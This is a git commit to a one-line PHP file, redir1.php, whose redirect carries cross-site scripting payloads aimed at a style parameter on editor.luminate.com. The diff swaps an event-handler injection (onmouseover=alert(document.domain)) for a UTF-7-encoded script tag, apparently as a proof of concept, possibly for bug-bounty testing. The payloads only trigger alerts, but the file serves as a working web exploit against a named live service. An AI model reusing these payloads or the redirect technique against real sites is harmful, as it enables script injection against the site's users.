9e56441e9d202c7b8aedc740056f9f473ae0c3fe
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-22 00:58:17 +0100

    Update redir1.php

--- redir1.php
+++ redir1.php
@@ -1,1 +1,1 @@
-<?php header('location: https://editor.luminate.com/stripe_dynamic_css?style_id=style-7043347e-krmbvhve&viewer=xprs&parent_style=ff=%3Cx~%0Aonmouseover=alert(document.domain)%3EAAA&v=1.4.1f') ?> 
+<?php header('location: https://editor.luminate.com/stripe_dynamic_css?style_id=style-7043347e-krmbvhve&viewer=xprs&parent_style=%2B/v8-%2BADw-script%2BAD4-alert(1)%2BADw-/script%2BAD4-') ?> 
